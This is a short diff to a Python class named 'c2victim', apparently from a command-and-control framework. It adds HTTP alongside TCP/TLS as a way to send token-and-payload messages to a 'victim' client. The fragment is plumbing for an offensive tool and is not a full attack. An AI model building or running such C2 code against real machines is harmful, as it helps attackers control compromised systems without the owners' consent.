@@ -490,7 +490,10 @@ class c2victim:
 
         aMsg = [szToken] + [szClassName] + [szPayload] + aMsgParam
 
-        clnt_victim.sendvictim(aMsg)
+        if clnt_victim.type == 'TCP' or clnt_victim.type == 'TLS':
+            clnt_victim.sendvictim(aMsg)
+        elif clnt_victim.type == 'HTTP':
+            clnt_victim.http_sendvictim(aMsg)
             
 if __name__ == '__main__':
     pass
